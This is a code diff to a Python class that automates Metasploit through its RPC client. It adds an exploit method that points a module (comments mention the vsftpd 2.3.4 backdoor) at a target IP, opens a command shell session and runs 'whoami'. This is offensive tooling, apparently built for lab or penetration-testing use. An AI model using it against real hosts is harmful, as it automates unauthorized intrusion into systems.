@@ -33,7 +33,7 @@ class Console:
     async def run_payload(self, shell_path, ip):
         old_len = len(self.client.sessions.list)
         exploit_result = self.exploit.execute(payload=shell_path)
-        exploit_result["ip"] = "192.168.17.130"
+        exploit_result["ip"] = ip
         logging.debug("job_id -> " + str(exploit_result["job_id"]))
         logging.debug(exploit_result)
         while True:
@@ -68,6 +68,25 @@ class Console:
         
     def get_sessions(self):
         return self.client.sessions.list
+    
+    async def exploit(self, ip, path):
+        logging.debug("before: "+str(self.client.sessions.list))
+        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
+        self.set_payload(path)
+        # self.set_payload('exploit/linux/postgres/postgres_payload')
+        self.set_arguments({
+            "RHOSTS":ip
+        })
+        #exploit_result = exploit.execute(payload='cmd/unix/interact')
+        session_id = await self.run_payload('cmd/unix/interact',ip)
+        if session_id is None: return
+        logging.debug("after: "+str(self.client.sessions.list))
+        await self.interact(session_id, "whoami",ip)
+        # print(client.sessions.list)
+        # shell = client.sessions.session('1')
+        # shell.write('whoami')
+        # print(shell.read())
+
 
     async def test(self):
         logging.debug("before: "+str(self.client.sessions.list))
